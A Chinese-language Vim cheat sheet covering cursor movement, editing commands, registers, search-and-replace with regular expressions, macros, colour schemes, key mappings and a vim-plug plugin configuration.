ci<, di<, yi<:修改、剪切或复制< >之间的内容并进入插入模式
ca<, da<, ya<:修改、剪切或复制< >之间的内容,包含< >,进入插入模式

viw 首先v进入选择模式,然后iw将选中当前单词
cw 删除单词并进入插入模式
3daw 删除3个单词

【 加上数字 】
可以在大部份的指令前加上数目字,代表要处理几次,所有移动指令都可以加上数目字来控制

5dd  刪除游标所在处起下五行內容
3r   按了3r后键入一个英文字,则三个字符皆会被所键入的英文取代,这不能用于中文。
5J   將五行合併成一行。
3x   刪除三个字符,不能用于中文。
5i A 然后按 Ecs,插入五个A。中文也可以
2i system Esc  插入 systemsystem。中文也可以！
5G 游标移至第五行,是从档首开始起算。
5l 移至右第五个字符处,j可用方向键取代的。

【 移动游标 】
h  左,或Backspace或方向键
j  下,或方向键
k  上,或方向键
l  右,或Space或方向键
+或Enter: 移至下一行第一个非空白字符。
-: 移至上一行第一个非空白字符。
gj 移动到一段内的下一行
gk 移动到一段内的上一行

Backspace及Space的移动方式是到了行首或行尾时会折行,但方向键或hl键的移动则在行首或行尾时继续按也不会折行
jk及用方向键上下移动游标会盡量保持在同一欄位,用Enter/+/-的上下移动,游标会移至上下一行的第一个非空白字符处。

水平移动
0  数字0或Home键,移至行首,含空白字符
g0 移到光标所在屏幕行行首
^  移至本行第一个非空白字符
g^: 同^,但是移动到当前屏幕行第一个非空字符处
$  移至行尾,或End键
g$: 移动光标所在屏幕行行尾
以上两个按键是源自正则表示式regexp中 ^ 是匹配行首,$ 是匹配行尾。

w  移至下一个单词开头
W  同上,以空白符分割单词,即忽略一些标點符号,如obj.attr
e  移至下一个单词尾
E  同上,但会忽略一些标點符号。
b  移至上一个单词开头,backword
B  同上,但会忽略一些标點符号。

页面移动
gg 移至第一行第一个非空白字符处
nG 游标移动到这个档案的第n行
G  移至最后一行的第一个非空白字符处,G表示goto,指移至指定数目行之行首,如不指定数目则默认最后一行。
ctrl+o 快速返回,多次使用逐一快读返回,Ctrl+o和Ctrl+i很像浏览器上的后退和前进

H(ead)  游标移至屏幕頂第一个非空白字符。
M(iddle)  游标移至屏幕中間第一个非空白字符。
L(ower)  游标移至屏幕底第一个非空白字符。
和PageDown,PageUp不一样,內文內容並未动,只是游标在动而已。

翻屏
ctrl+f  Page Down翻页,forward
ctrl+b  Page Up翻页
ctrl+d  屏幕向下移动半页
ctrl+u  屏幕向上移动半页,upword
zz 把当前行显示到屏幕中间
zt 将当前行移动到屏幕顶端。
zb 将当前行移动到屏幕底端。
ctrl+e: 向下滚动一行。
ctrl+y: 向上滚动一行。
n%: 到文件n%的位置。

n| 移至第n个字符处,要用Shift键,n是从頭起算的。
n+[Space] n表示数字,按下数字后再按空格键,游标会向右移动到这一行的第 n 个字符
n+[Enter] 游标向下移动n行
:n 移至第n行行首,或nG
:$ 移动到最后一行

垂直移动
)  移至下一个句子,sentence首
(  移至上一个句子,sentence首
}  移至下一个段落,paragraph首
{  移至上一个段落,paragraph首
sentence是以. ! ?区格,paragraph是以空白行为区格。

行间搜索移动
同一行快速移动的方式其实是搜索一个字符并移动到该字符
使用f{char}可移动到char字符上即f加要搜索的字符,t移动到char的前一个字符
如果第一次没搜索到则可以使用分号或逗号继续搜索该行下一个或上一个
大写F表示反过来搜索前面的字符

%  这是匹配{},[],()用的,例如游标现在在{上,按%游标就会移动到相匹配的}上

【 标记、书签功能 】
使用标记可以快速移动。到达标记后可以用Ctrl+o返回原来的位置。Ctrl+o和Ctrl+i很像浏览器上的后退和前进
可以在文章中的某处做个记号(marks),然后跑到其它地方去编辑,再呼叫这个mark时又会回到原处

m{a-z}: 标记光标所在位置,局部标记,只用于当前文件。
m{A-Z}: 标记光标所在位置,全局标记,标记之后退出重启Vim标记仍然有效
`{a-z}: 移动到标记位置。
'{a-z}: 移动到标记行的行首。
`{0-9}:回到上[2-10]次关闭vim时最后离开的位置。
``: 移动到上次编辑的位置。''也可以,不过``精确到列,而''精确到行 。如果想跳转到更老的位置,可以按C-o,跳转到更新的位置用C-i。
`": 移动到上次离开的地方。
`.: 移动到最后改动的地方。
:marks 显示所有标记。
:delmarks a b -- 删除标记a和b。
:delmarks a-c -- 删除标记a、b和c。
:delmarks a c-f -- 删除标记a、c、d、e、f。
:delmarks! -- 删除当前缓冲区的所有标记。
:help mark-motions 查看更多关于mark的知识。

【 刪除剪切 x d 】
Del 向后删除一个字符
[n]x 剪切光标右边n个字符,相当于d[n]l
[n]X 剪切光标左边n个字符,相当于d[n]h
X 刪除游标前字符,亦可用Backspace键删除前一个字符

d 删除(剪切)在可视模式下选中的文本
dd 刪除一整行(delete line)
[n] dd 删除(剪切)1(n)行
dw 刪除一个字(delete word),不適用于中文
daw 删除整个单词,包括周围的空格(delete around word)
daw和das 剪切一个词和剪切一个句子,即使光标不在词首和句首也没关系
diw 删除整个单词,但不删除周围的空格
d[n]w 删除(剪切)1(n)个单词
d[n]l 删除(剪切)光标右边1(n)个字符。
d[n]h 删除(剪切)光标左边1(n)个字符
dG 刪至档尾
d1G 刪至档首,或dgg
D 刪至行尾,或d$,含游标所在处字符
d0 刪至行首,或d^,不含游标所在处字符,$及^所代表的意义就可以理解d$及d^的动作
d) 删除到下一句的开始
dt) delete to ),删除括号内的所有内容
dt"  delete to ",删除引号内的所有内容
dty delete to y,删除y字符前的所有文本
d} 删除到下一段的开始
d 删除两行

:m,nd 剪切m行到n行的内容

d/f 这是一个比较高级的组合命令,它将删除当前位置到下一个f之间的内容

【 复制粘贴 yank 】
yank在vim中就是复制copy的意思,p是paste
vim复制、粘贴的功能再配合数目字及vim內部的缓冲区来使用

vim中的剪贴(cut)、复制(copy)、粘贴(paste)分别是delete、yank、put

normal模式复制粘贴使用y(yank)和p(put)、剪贴d(delete)和p,比如dd删除一行在再put粘贴
可使用v(visual)命令选中要复制的地方y复制再使用p粘贴
配合文本对象:比如使用yiw复制一个单词,yy复制一行

insert模式下的复制粘贴
通常使用鼠标选中,然后用ctrl+v或单击鼠标右键粘贴
但粘贴代码时,如果vimrc中设置autoindent,粘贴python代码缩进错乱,这时需要使用:set paste 和 :set nopaste,setpaste之后缩进失效,需要setnopaste重新缩进

y   复制在可视模式下选中的文本
yy  复制游标所在行整行,或Y
nyy 复制游标所在的那一行往下数n行,2yy或y2y复制两行
y^  复制至行首,或y0,不含游标所在处字符。
y$  复制至行尾,含游标所在处字符。
y[n]w 复制一(n)个词
yaw和yas 复制一个词和复制一个句子,即使光标不在词首和句首也没关系
y[n]l 复制光标右边1(n)个字符。
y[n]h 复制光标左边1(n)个字符
yG  复制至档尾。
y1G 复制至档首。
y0  复制游标所在的字符到该行行首的所有数据
y$  复制游标所在的字符到该行行尾的所有数据

:m,ny 复制m行到n行的内容
将第九行至第十五行的数据复制到第十六行
:9, 15 copy 16
:9, 15 co 16

将第九行至第十五行的数据移动到第十六行
:9, 15 move 16
:9, 15 m 16

整行的复制按p或P时是插入式的贴在下上一行,非整行的复制则是贴在游标所在处之后前
p 在光标之后粘贴。
P(大写) 在光标之前粘贴

【 寄存器register :h registers 】
normal模式d删除和y复制的内容默认暂存在名为无名寄存器的寄存器,而不是系统粘贴板,这和其他编辑器不同
用d、c、s、x、y等指令改变或刪除的內容都是放在registers中的。例如用dd刪除的一行,也是可以使用p来贴上的。只要是在缓冲区的內容都可以使用p来贴上,不是一定要y起来的內容才能用p,因此认为p是paste也可以
用x删除的一个字符放到无名寄存器,然后p粘贴,可调换量两字符

vim不使用单一剪贴板进行剪贴、复制和粘贴,而是使用多组寄存器
通过"{register}双引号加寄存器名称前缀指定寄存器,不使用默认的无名寄存器
比如使用"ayiw复制一个单词到a寄存器中,"bdd删除当前行到b寄存器中
可将常用内容复制到某个寄存器中,需要的时候直接粘贴该寄存器中的内容即可

a可为26个英文字母中的任意一个,如果小写原先的內容会被清掉,如果大写则是append的作用把內容附加到原先內容之后
"ayy  將本行文字复制到a缓冲区
5"ayy  复制五行內容至a缓冲区
5"Ayy  再复制五行附在a內容之后,现在a中有十行內容了
"ap  將a缓冲区的內容贴上。

:reg 列出所有registers的代号及內容
:reg a 显示寄存器a中的内容

1.无名(unnamed)寄存器:"",缺省使用,缓存最后一次操作内容;
2.数字(numbered)寄存器:"0 ~"9,缓存最近操作内容,复制与删除有别, "0寄存器缓存最近一次复制的内容,"1-"9缓存最近9次删除内容
3.行内删除(small delete)寄存器:"-,缓存行内删除内容;
4.具名(named)寄存器:"a ~ "z或"A - "Z,指定时可用;
5.只读(read-only)寄存器:":,".,"%,"#,分别缓存最近命令、最近插入文本、当前文件名、前一次编辑的文件名;
6.表达式(expression)寄存器:"=,只读,用于执行表达式命令;
7.选择及拖拽(selection and drop)寄存器:"*,"+,"~,存取GUI选择文本,可用于与外部应用交互,使用前提为系统剪切板(clipboard)可用;执行命令:reg查看是否有+或×号,或执行:version命令查看是否有+clipboard,如果不存在则sudo apt install vim-gnome
8.黑洞(black hole)寄存器:"_,不缓存操作内容(干净删除);
9.模式寄存器(last search pattern):"/,缓存最近的搜索模式。
10.系统剪贴板 "+可以在复制前加上 "+复制到系统剪贴板,"+yy把当前行的内容放入系统剪贴板

系统剪贴板
:echo has('clipboard')为1则支持系统剪贴板的寄存器"+
:set clipboard=unnamed可直接复制粘贴系统粘贴板的内容
选择及拖拽寄存器就是系统的剪贴板,通常使用的ctrl+c、ctrl+v的内容就保存在这个寄存器中,所以要把需要复制的内容放在+寄存器中,就可以在gui界面中用粘贴或ctrl+v粘贴了,同理粘贴在vim中也一样
"+y   复制到系统剪贴板
"+p   粘贴
"+gp  粘贴并且移动光标到粘贴内容后

但是光是输入命令"+p就已经让人觉得很麻烦了,这时候vim的map功能就又可以大显神通了,只需要把"+y和"+gp map到喜欢的快捷键上即可:

首先打开vimrc(如果没有则创建一个)
vim ~/.vimrc
然后在其中输入:
nmap ＜c-v> "+gp
nmap ＜c-c> "+y
现在就可以使用ctrl+c和ctrl+v了,但是不推荐用这个快捷键的,因为ctrl+v是很常用的块命令,可以修改成:
nmap ＜leader>v "+gp
nmap ＜leader>c "+y
至于＜leader>是什么按键,就可以按照自己喜好来如','
let mapleader=","
nmap说明这个命令只有在normal情况下才生效,在insert模式下是不生效的,为什么要这样设置呢？因为有时候确实需要输入＜leader>c/v的内容比如c、v,而且vim主要操作还是应该在normal模式下,这才是vim的高效的原因。

【 快速修改 r(replace) c(change) s(substitute) 】
normal模式下使用r可替换一个字符,s替换并进入插入模式,c可配合文本对象

替换(normal模式)
r: 替换光标处的字符,同样支持汉字。
R: 进入替换模式,不断的替换后面的字符,按esc回到正常模式。

改变大小写
~: 反转光标所在字符的大小写。
可视模式下的U或u:把选中的文本变为大写或小写。
gu(U)接范围如$或G可以把从光标当前位置到指定位置之间字母全部转换成小写或大写,如ggguG就是把开头到最后一行之间的字母全部变为小写,如gu5j把当前行和下面四行全部变成小写。

s  替換一个字符为所输入的字串。R是覆盖式的取代,s则是插入式的取代
4s 删除4个字符并进入插入模式
S  删除整行并进入插入模式

cc 取代整行內容并进入插入模式,同S
cw change word,进入插入模式,中文不适用
caw change around word
c0 取代至行首,或c^。
C  取代至行尾,即游标所在处以后的字都会被替換,或c$。
ct) 删除括号内的内容并进入插入模式
ct" 删除引号内的内容并进入插入模式

改写插入
c[n]w: 改写光标后1(n)个词。
c[n]l: 改写光标后n个字母。
c[n]h: 改写光标前n个字母。
[n]cc: 修改当前[n]行。
[n]s: 以输入的文本替代光标之后1(n)个字符,相当于c[n]l。
[n]S: 删除指定数目的行,并以所输入文本代替之。
类似cnw,dnw,ynw的形式同样可以写为ncw,ndw,nyw

【 搜索查找 】
:syntax on 语法高亮
:set hls 设置搜索的高亮匹配,height lingt search
:set incsearch 设置增量搜索,即边输入边高亮搜索

/word 前向搜索关键字为word,回车结束输入,常配合使用n或N搜索
?word 后向搜索关键字为word
/pattern/+number 将光标停在包含pattern的行后面第number行上
/pattern/-number 将光标停在包含pattern的行前面第number行上
n 向后查找下一个
N 向前查找下一个

*  当前单词的前向匹配
#  当前单词的后向匹配
g* 同*,但部份符合即可
g# 同#,但部份符合即可

可以用grep或vimgrep查找一个模式都在哪些地方出现过,其中:grep是调用外部的grep程序,而:vimgrep是vim自己的查找算法。
用法为: :vim[grep]/pattern/[g] [j] files
g的含义是如果一个模式在一行中多次出现,则这一行也在结果中多次出现。
j的含义是grep结束后结果停在第j项,默认是停在第一项。
vimgrep前面可以加数字限定搜索结果的上限,如:1vim/pattern/ % 只查找那个模式在本文件中的第一个出现。

其实vimgrep在读纯文本电子书时特别有用,可以生成导航的目录。
比如电子书中每一节的标题形式为:n. xxxx,可以这样:vim/^d{1,}./ %,然后用:cw或:copen查看结果,可以用C-w H把quickfix窗口移到左侧,就更像个目录了。

【 搜索查找替換(substitute) 】
:[range] s/pattern/string/[c,e,g,i]

关于range的规定为:
如果不指定range则表示当前行。
m,n: 从m行到n行。
0: 最开始一行
$: 最后一行
.: 当前行
%: 所有行
1,$指从第一行至最后一行也就是目前编辑的整个文档,也可以%代表

pattern  就是要被替換掉的字串,可以用regexp来表示。
string   將pattern由string所取代。

c  confirm,每次替換前会询问
e  不显示error
g  global,全局匹配
i  ignore不分大小写
n  number,报告匹配到的次数而不是替换
g大概都是要加的,否则只会替換每一行的第一个符合字串。可以合起来用,如cgi,表示不分大小写,整行替換,替換前要詢問是否替換。

:s/old/new 用new替换当前行第一个old
:s/old/new/g 用new替换当前行所有的old
:%s/Edwin/Edward/g 整篇文章的Edwin替換成Edward
:%s/,/\r&/g 替换,逗号前面加回车
:n1,n2s/word1/word2/g 在第n1行与第n2行之间寻找word1字符串并替换为word2
:1,$s/word1/word2/g 表示从第一行到最后一行,将word1字符串替换为word2
:1,$s/word1/word2/gc 表示从第一行到最后一行将word1替换为word2,替换前显示提示由用户确认是否最终替换
:1,6 s/\< self\>/this/g 正则替换单词
:1,6 s/^self/this/g 正则替换整行
:%s/^/xxx/g 在每一行的行首插入xxx,^表示行首。
:%s/$/xxx/g 在每一行的行尾插入xxx,$表示行尾。
:1,6 s/self//n 统计1-6行之间self出现的次数

【 替换,匹配到某个模式后执行某种命令 】
:[range]g/pattern/[cmd]
cmd是ed可用的指令,默认是p(print),可查一下man ed就可以知道有什么指令可用。
d(delete)是行刪除指令,凡含pattern的整行都会被刪掉,range默认是这个文档,因为g就是代表globe。

:%g/^ xyz/normal dd
对于以一个空格和xyz开头的行执行normal模式下的dd命令

:g/^$/d
刪除全文的空白行,如果空白行里包含了其它空白字符即Space或Tab,表面看起来和一般空白行一模一样,用上面的方法就无法刪除这种空白行

:g/^[< Space>< Tab>]*$/d
:g/^\s*$/d
:%s/^$//g 不可以刪除空白行,因为:s这个指令只修改一行的內容,但不会做刪除一行的动作。

:g/"/d 删除有双引号的行

& 替代变数
代表置換时合于patern的字符或字串。
:%s/\u\d\d\d\d\d\d\d\d\d\>/ID:&/g
全文中的身份证号码前就会加上ID:字样,即T123456789会被換成ID:T123456789。\d就是[0-9],\u代表大写的英文字母,\>是防止T12345678999也被換掉,前面再加个\<更保險

表示將文件3至7行的内容向右移2个空白,但这样連空白行也是会插入空白字符,較高明的做法是第二个
:3,7s/.*/  &/
:3,7s/.\+/  &/

將档案3至7行的資料向左移2个空白,就是刪去行首的二个空白
:3,7s/^  //

將全文的Edward这个单字,前后加上中括号
:%s/\< Edward\>/[&]/g

將全文的Edward这个单字,改成大写的。
:%s/\< Edward\>/\U&/g
\U在pattern的位置的时候是指非大写字母的样式,即[^A-Z],但如果是在置換字串位置的时候是指將其后的字串改成大写。與其相对的是\L,会將其后的字串改为小写。详细:h sub-replace-special。

將全文每行最后加上/r/n
:%s/.*/&/r/n/g

regexp贪婪模式:在同一行內如果有多个符合pattern的情形会找最長的那一个,例如:*, \=, \+, \{} 等。.*在整篇文章中做替換时会被當成是每一行整行,因为regexp会去找每一行最長符合的那一个。

This is a test. Test for regexp.
:%s/[Tt].*t/program/g 原意是想把所有的Test或test換成program的,结果由于regexp的貪心,整个"This is a test. Test"会換成program。结果原文就变成了program for regexp. 因此在全文替換时要非常小心,避免使用彈性太大的regexp。像此例只要:%s/\<[Tt]est\>/program/g即可

【 vim中的正则表达式 】
regular expression简称regexp,:h pattern或在Un*x系统中可man 7 regex,甚至man ed,man sed,man grep,man awk,man perlre也是会说些regexp,但要注意和vim差异的地方,其中perl的regexp是最完整的了

基本的匹配
*    指字符或字符集合出现0次或0次以上,如dg*:d,dg,dgg,dggg都是符合这个pattern。%s/dg*/test/g,extended这个字会換成extentestetest。
\+   和*作用相同,但不包括出现0次。如dg\+:dg,dgg,dgggggg皆符合,但d则不符合
\=   指字符恰好出现0或1次。dg\=只有d、dg这两个符合,/123-\=4567找出123-4567及1234567或123-456789
\|   or,被\|隔开的pattern,任一个符合就算符合。:%s/The\|All/test/g表示全文中只要是The或All都会被替換成test
** 当前目录下的所有子目录

\(...\)
记忆pattern,可由\1, \2...\9来叫出。
:%s/\([a-z]\)\1/test/g表示aa,bb,cc,dd,...,zz都会被test替換掉,即\(...\)由\1叫出时会有对称性的配对出现。
:%s/\(.\)\(.\)r\2\1/test/g表示將中間为r,前有二个任一字符,后有两个具对称性的字符所組成的字串替換成test,\2是呼叫第二組\(.\),而\1是呼叫第一組 \(.\)。12r21,cfrfc,7grg7等都会被替換成test。

.*
这代表任意字符或字串,或什么都沒有,这是不包括換行字符的。

.      除換行字符外的任何单一字符。如果要指定真正的英文句點要用\来escape,即\.代表真正句點
[...]  字符集合,表示中括号中所有字符中的其中一个。[Aa]表示A或a其中的一个,[12345]表示12345其中的一个数目字,可用[1-5]表示
[^..]  这是上述 [...]的补集,表非中括号內字符的其中一个。[^M]表除M以外的任意字符。[^Tt]表T及t以外的任意字符。[^0-9]表非数目字之字符。[^a-zA-Z]　表非英文字母之字符。

^  匹配行首,不是在行首的^指的是^这个字符
$  匹配行尾,含換行字符。不是在行尾的$是指$本身这个字符。
/^What表示只有在行首的What才会被找出来。Whatever, What's也是会被找出来。如果是/What$则是在行尾的What才会被找出来。
^$表示空白行,空白行至少也是会有个換行字符

\<  匹配word的开头。word包括文数字及底线。
\>  匹配word的尾,被\<,或\>括住的pattern就会被限制住,使regexp不能再向右(左)扩充解释
在vim中\b是表示< BS >即backspace键

:%s/\< abbbc\>/test/g
只有abbbc才会被替換成test。如果沒有这样限定,:%s/abbbc/test/g,那deabbbcly中的0"abbbc"亦会被替換成test。
所以前面:%s/The\|All/test/g可換成:%s/\< The\>\|\< All\>/test/g这样一来There就不会被替換成testre

:%s/\< abbbc/test/g
只要是以abbbc为首的word,其中的abbbc的部份都会被test所替換。abbbc,abbbcerd,abbbckijuds 都符合。

\{n,m}或\{n,m\}  指前所綁住的字符或字符集合最少出现n次,最多出现m次。
[0-9]\{3,4}匹配至少三位数,但不可多于四位数的数目字

\{数字}
xy\{20}表示x后接20个y。
e[x-z]\{4}表示e后接有四个字符,是x,y,z的其中一个的組合。如:exxxx, exyyz, ezzyz, exyzz皆符合。

\{最小值,}
xy\{2,}表x后接至少二个的y,相对于xyyy*或xyy\+

\{,最大值}
xy\{,4}表x后接至多四个或更少的y(可能沒有),因此x, xy, xyy ,xyyy, xyyyy皆符合。

中介字符(metacharacter, or character classes)
主要是简化regexp的书写,使用中介字符的比对速度將会比使用字符集合 [] 的快。

\s  表空白字符,即Space或Tab,不含換行字符,这是编辑器的特性使然。在perl的\s是包含換行字符的,vim不支援\n这种換行中介字符。
\S  表非空白字符。
\d  表数字(digits),即[0-9]。
\D  表非数目字,即[^0-9]。
\w  表一般字符(word character),包括底线。即[0-9a-zA-Z_]。
\W  表非一般字符,即 [^0-9a-zA-Z_]。
\a  表英文字母(alphabetic character),即[a-zA-Z]。
\A  表非英文字母,即 [^a-zA-Z]。
\l  表小写字母(lowercase character),即[a-z]。
\L  表非小写字母,即 [^a-z]。
\u  表大写字母(uppercase),即 [A-Z]。
\U  表非大写字母,即 [^A-Z]。

【 使用宏(macro)完成批量操作 】
宏可看成是一系列命令的集合,可以使用宏录制一系列的操作,然后用于回放
宏可以非常方便的把一系列命令用在多行文本上

. --重复上一个编辑动作
qa:开始录制宏a(键盘操作记录)
q:停止录制
@a:播放宏a

vim normal模式下使用q键来录制和结束录制
使用q{register}选择要保存的寄存器,把录制的命令保存在其中,如qa
使用@{register}回放寄存器中保存的一系列命令

需求:给多行url加上双引号
先给一行加上引号,然后再回放到其他行
先使用q开始录制,给一行加上双引号,之后使用q退出
在剩下的行中回放录制的宏

I移动游标到行首并进入insert模式,加双引号,esc
A移动游标到行尾并进入insert模式,加双引号

qa表示开始录制宏到寄存器a中
给一行加双引号
esc回到normal模式,q结束录制
j移动到下一行,@a回放
对剩下行一键回放:v命令全选,:加mormal @a表示在v模式下执行normal模式下的目录

【 简单排版功能 】
>>  整行向右缩进一个shiftwidth,默认是8个字符,可重设
<<  整行向左缩进一个shiftwidth,默认是8个字符,可重设
:set shiftwidth? 可得知目前的设定值。:set shiftwidth=4重设为4个字符。shiftwidth可简写成sw

多行缩进
n>>光标以下的n行会缩进。
n<<光标以下的n行会缩出。
在可视模式下选择要调整的代码块按=,代码会按书写规则缩排好。
n =,调整n行代码的缩排。

:ce(nter)  本行文字置中
:ri(ght)   本行文字靠右
:le(ft)    本行文字靠左
置中、靠左右是參考textwidth(tw)设定。如果tw沒有设定默认是80,就是以80个字符为总宽度为标准来置放,也可以如sw一样重设。

gq 对选中的文字重排,即对过长的文字进行断行
gqq 本行重排
gqnq 重排n行
gqap 重排当前段
gqip 整段重排,中文会出槌
gqnap 重排n段
gqnj 重排当前行和下面n行
gqQ 重排当前段对文章末尾
J 拼接当前行和下一行
gJ 同J,不过合并后不留空格
重排的依据也是textwidth。这里的重排是指键入文字时沒有按Enter键就一直在keyin,这样会形成一个很長的一行,雖然屏幕上会做假性折行),重排后则会在每一行最后加入EOL

【 拼写检查 】
:set spell－开启拼写检查功能
:set nospell－关闭拼写检查功能
]s－移到下一个拼写错误的单词
[s－作用与上一命令类似,但它是从相反方向进行搜索
z=－显示一个有关拼写错误单词的列表,可从中选择
zg－告诉拼写检查器该单词是拼写正确的
zw－与上一命令相反,告诉拼写检查器该单词是拼写错误的

【 vim的加密功能 】
vim -x filename
这样进入vim后会要求输入密码,以后加密过的档案由vim开启时会自动要求输入密码,否则无法开启
进入vim编辑档案中,临时加密可用:X指令,Vim提示设定密码,然后键入:w保存即可
:set key= -- 去除文件的密码

【 文件的编码 】
:e ++enc=utf8 filename, 让vim用utf-8的编码打开这个文件。
:w ++enc=gbk,不管当前文件什么编码,把它转存成gbk编码。
:set fenc或:set fileencoding,查看当前文件的编码。

在vimrc中添加set fileencoding=ucs-bom,utf-8,cp936,vim会根据要打开的文件选择合适的编码,编码之间不要留空格,cp936对应于gbk编码,ucs-bom对应于windows下的文件格式。
让vim正确处理文件格式和文件编码有赖于 ~/vimrc的正确配置

【 文件格式 】
大致有三种文件格式:unix, dos, mac,三种格式的区别主要在于回车键的编码:dos下是回车加换行,unix下只有换行符,mac下只有回车符。
:e ++ff=dos filename, 让vim用dos格式打开这个文件。
:w ++ff=mac filename, 以mac格式存储这个文件。
:set ff,显示当前文件的格式。
在vimrc中添加set fileformats=unix,dos,mac让vim自动识别文件格式。

【 紧急恢复 】
vim -r filename,或进入vim后:recover filename来恢复

vim一开档就会有个.filename.swp文件是为了紧急恢复用的,一般是在所开档案的所在目录,这是个隐藏档,ls要有-a参数才看得到,加密的功能並沒有作用在这个swp文件,因此root可查看该文件的内容
可以把swap的功能关掉的:set noswf,但如果编辑的是大档案则不建议把swap关掉,这样会很吃内存的。

【 执行外部命令 shell命令 】
:!cmd  !表示强制执行,暂时离开vi到指令列模式下外部指令的显示结果,指令要在PATH內。
:!! 执行上一次执行的外部指令。
:!ps aux

:sh(ell)  执行shell,使用exit返回到vim
这在vim GUI会在原视窗內显示执行结果。console或xterm下的vim当然就是跳出vim进入shell中。
至于是用哪一种shell是可以另外设定的,可由set shell=来设定。
windows版本设定时如遇有空白字符文件名时要由\来escape,例如:set shell=\"c:\program\ files\unix\sh.exe\"\ -f

:r !commond
在游标下一行插入外部指令commond执行后的输出內容,例如:r !date会插入日期时間

:n,mw !commond
以n至m行內之資料當做外部指令commond的input

K
打开光标所在词的manpage

【 配色 】
:colorscheme查看当前的配色方案、主体配色,默认default
:colorscheme ctrl+d 显示所有配色,系统的配色方案放在/usr/share/vim/vim80/colors/
:colorscheme 方案名 修改配色
:colo ev[TAB]
:colo industry
blue      default  desert   evening   koehler  murphy  peachpuff  ron    slate  zellner
darkblue  delek    elflord  industry  morning  pablo    shine  torte

设置喜欢的配色方案
通过下面的网址查看配色方案并下载
下载:http://www.cs.cmu.edu/~maverick/VimColorSchemeTest/index-c.html
https://github.com/flazz/vim-colorschemes
这个网址列出了300多个配色方案以及实际的显示效果,点击方案名称即可下载到一个.vim文件,将该文件放入$VIM/colors目录(没有该目录则先创建该目录),然后在vimrc中添加:
" set color schema
colorscheme freya

【 color.vim文件解析 】
hi    Normal    guifg        guibg        ctermfg        ctermbg
"颜色    属性    gui前景色    gui背景色    终端前景色    终端背景色

hi clear
"使用默认的高亮(移除用户定义的高亮,即根据'ft'重新载入语法文件)

hi link name1 name2
"进行颜色关联,让name1使用与name2一样的颜色设置
hi link name1 NONE
"清除name1的颜色关联

"guifg/guibg支持三个特殊的值:none、fg、bg,分别表示无颜色、编辑区一般文本的前景色、一般文本的背景色。

由于vim可以在黑白终端、彩色终端、GUI界面下运行,所以需要对其分贝进行配置,下面给出一个简要说明
terminal  含义
term    黑白终端的属性
cterm   彩色终端的属性
ctermfg 彩色终端前景色
ctermbg 彩色终端背景色
gui     GUI属性
guifg   GUI前景色
guibg   GUI背景色

set t_Co=256   "告知配色,终端支持256色。
由于不是所有终端都支持256色,因此使用一些安全色会使我们的主题更有移植性,而GUI可以支持所有颜色,不在考虑范围之内,vim文档给出的安全色如下:
number  颜色
0   Black
1   DarkBlue
2   DarkGreen
3   DarkCyan
4   DarkRed
5   DarkMagenta
6   Brown, DarkYellow
7   LightGray, LightGrey, Gray, Grey
8   DarkGray, DarkGrey
9   Blue, LightBlue
10  Green, LightGreen
11  Cyan, LightCyan
12  Red, LightRed
13  Magenta, LightMagenta  洋红
14  Yellow, LightYellow
15  White

配色语法
hi  Type    ctermfg=LightYellow     ctermbg=Black   cterm=bold
其中hi是highlight命令的缩写,用于高亮配置;Type是要配色的元素名称;参数采用的是Key=Value的形式

【 vim映射 】
vim映射就是把一个操作映射到另一个操作,改变vim的默认操作
基本映射指normal模式下的映射,当然还有其他模式的映射
使用map就可以实现映射
:map - x表示减号来代替x指令来删除字符,x指令仍旧有效
:map < space> viw表示按空格选中整个单词
:map < c-d> dd表示ctrl+d执行dd删除一行
:unmap -表示删除减号的映射

vim常用模式normal/visual/insert都可以定义映射
用nmap/vmap/imap定义映射只在normal/visual/insert分别有效
:vmap \ U表示在visual模式下按斜线则选中的文本转换大小写
:imap < c-d> < Esc>ddi表示ctrl+d在insert模式下删除一行,esc退出insert进入normal,dd删除一行,i回到insert模式

递归映射和非递归映射
:nmap - dd
:nmap \ -
按下\时vim会解释为-,又映射了-,vim会继续解析-为dd删除一行,有点类似于递归,map系列命令有递归风险
如果安装了一个插件,插件映射了同一个按键的不同行为,有冲突就会有一个失效

vim提供了非递归映射,这些命令不会递归解释
使用*map对应的noremap/nnoremap/vnoremap/inoremap非递归映射版本
任何时候都应该使用非递归映射

"一些方便的映射
let mapleader=','
let g:mapleader=','

"使用jj进入normal模式,`^表示即使进入normal模式光标的位置也不会变
innoremap jj < Esc>`^
"insert和normal模式使用leader+w直接保存
innoremap < leader>w < Esc>:w< cr>
noremap < leader>w :w< cr>

"切换buffer
nnoremap < silent> [b :bprevious< CR>
nnoremap < silent> [n :bnext< CR>
"user ctrl+h/j/k/l switch window
noremap < C-h> < C-w>h
noremap < C-j> < C-w>j
noremap < C-k> < C-w>k
noremap < C-l> < C-w>l

"sudo强制写入保存
cnoremap w!! w !sudo tee % >/dev/null
"json格式化,com!表示在command模式下使用FormatJSON命令来格式化json
com! FormatJSON %!python3 -m json.tool

【 vim插件扩展 】
vim插件使用vimscript或其他语言编写的vim功能扩展

安装插件
原始的方式是直接clone插件代码,如今vim有很多插件管理器,常见的有vim-plug, Vundle, Pathogen, Dein.Vim, volt等
推荐使用vim-plug安装插件,vim-plug可在github下载

</pre><textarea>"~/.vimrc插件设置,这里使用vim-plug
call plug#begin('~/.vim/plugged')

"安装插件只需要把github地址放到这里,然后重启或source ~./vimrc,再执行在命令模式:PlugInstall
"vim开屏插件https://github.com/mhinz/vim-startify修改vim的启动界面,直接进入vim显示最近打开的文件
Plug 'mhinz/vim-startify'
"状态栏美化插件https://github.com/vim-airline/vim-airline
Plug 'vim-airline/vim-airline'
Plug 'vim-airline/vim-airline-themes'

"增加代码缩进线条https://github.com/yggdroot/indentline
Plug 'yggdroot/indentline'
"文件目录树管理,安装之后:NERDTreeToggle即可显示注册目录树,可给该命令添加映射
Plug 'scrooloose/nerdtree'
"快速根据文件名查找并打开文件,模糊搜索器ctrlp插件,Full path fuzzy file, buffer, mru, tag, ... finder for Vim
Plug 'ctrlpvim/ctrlp.vim'

"python插件使用较多的是jedi-vim和python-mode,python-mode支持补全、跳转、重构、格式化
Plug 'python-mode/python-mode', {'branch':'develop'}

"vim配色方案
"https://github.com/w0ng/vim-hybrid
"https://github.com/altercation/vim-colors-solarized
"https://github.com/morhetz/gruvbox
set background=dark
colorscheme hybrid
Plug 'w0ng/vim-hybrid'

call plug#end()

"ctrlp配置
let g:ctrlp_map = '< c-p>'

</textarea><pre>
【 vim配置 set功能设定参数 :h option-list 】
可临时设定,例如:set ai或:set noai,ai是autoindent的缩写,这样就可以马上上改变缩格的设定,但离开vim后就又恢復原狀。

